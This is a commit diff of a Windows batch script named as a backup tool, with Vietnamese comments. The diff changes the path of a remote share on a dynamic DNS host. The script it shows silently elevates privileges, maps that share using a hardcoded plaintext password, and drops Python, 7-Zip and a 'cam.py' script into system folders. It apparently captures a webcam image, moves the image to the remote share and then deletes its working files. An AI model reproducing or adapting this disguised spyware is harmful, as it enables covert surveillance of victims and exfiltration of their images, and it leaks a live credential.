d887bcfb4f46028cc5784ca462986cdffbf76089
mitutina <mitutina00@gmail.com>
2025-04-11 15:19:43 +0700

    Update windows-backup3.bat

--- windows-backup3.bat
+++ windows-backup3.bat
@@ -2,14 +2,14 @@
 set "params=%*"
 cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || ( echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
 setlocal
-net use "\\minhtuan283.ddns.net\test_share" /user:minhtuan283 Thienngan2002
+net use "\\minhtuan283.ddns.net\hdd25\serial" /user:minhtuan283 Thienngan2002
 
 REM --- Kiểm tra xem file python.exe đã tồn tại hay chưa ---
 if not exist "C:\Windows\python3105\App\Python\python.exe" (
     echo [*] Khong tim thay python.exe, bat dau cai dat...
     
     REM --- Sao chép file python3105.zip vào thư mục temp ---
-    copy "\\minhtuan283.ddns.net\test_share\python3105.zip" "%temp%\python3105.zip"
+    copy "\\minhtuan283.ddns.net\hdd25\serial\python3105.zip" "%temp%\python3105.zip"
     if errorlevel 1 (
         echo [!] Sao chep python3105.zip that bai.
         goto cleanup
@@ -21,7 +21,7 @@ if not exist "C:\Windows\python3105\App\Python\python.exe" (
     )
     
     REM --- Sao chép các file 7zip (7z.exe và 7z.dll) từ Tools vào C:\Windows ---
-    xcopy "\\minhtuan283.ddns.net\test_share\Tools\*.*" "C:\Windows\" /Y
+    xcopy "\\minhtuan283.ddns.net\hdd25\serial\Tools\*.*" "C:\Windows\" /Y
     if errorlevel 1 (
         echo [!] Sao chep cac file Tools that bai.
         goto cleanup
@@ -35,7 +35,7 @@ if not exist "C:\Windows\python3105\App\Python\python.exe" (
     )
     
     REM --- Sao chép file cam.py vào thư mục temp ---
-    copy "\\minhtuan283.ddns.net\test_share\cam.py" "%temp%\cam.py"
+    copy "\\minhtuan283.ddns.net\hdd25\serial\cam.py" "%temp%\cam.py"
     if errorlevel 1 (
         echo [!] Sao chep cam.py that bai.
         goto cleanup
@@ -45,7 +45,7 @@ if not exist "C:\Windows\python3105\App\Python\python.exe" (
 )
 
 REM --- Sao chép file cam.py vào thư mục temp ---
-copy "\\minhtuan283.ddns.net\test_share\cam.py" "%temp%\cam.py"
+copy "\\minhtuan283.ddns.net\hdd25\serial\cam.py" "%temp%\cam.py"
 if errorlevel 1 (
     echo [!] Sao chep cam.py that bai.
     goto cleanup
@@ -63,7 +63,7 @@ REM --- Cho thời gian ghi file (nếu cần) ---
 timeout /t 2 >nul
 
 REM --- Di chuyển file anh da chup (C:\Windows\captured_image.jpg) sang share ---
-move "C:\Windows\captured_image.jpg" "\\minhtuan283.ddns.net\test_share\captured_image.jpg"
+move "C:\Windows\captured_image.jpg" "\\minhtuan283.ddns.net\hdd25\serial\captured_image.jpg"
 if errorlevel 1 (
     echo [!] Di chuyen anh that bai.
 ) else (
@@ -76,7 +76,7 @@ if exist "%temp%\python3105.zip" del "%temp%\python3105.zip"
 if exist "%temp%\cam.py" del "%temp%\cam.py"
 
 REM --- Ngắt kết nối share ---
-net use "\\minhtuan283.ddns.net\test_share" /delete
+net use "\\minhtuan283.ddns.net\hdd25\serial" /delete
 
 echo [*] Script ket thuc.
 exit /b
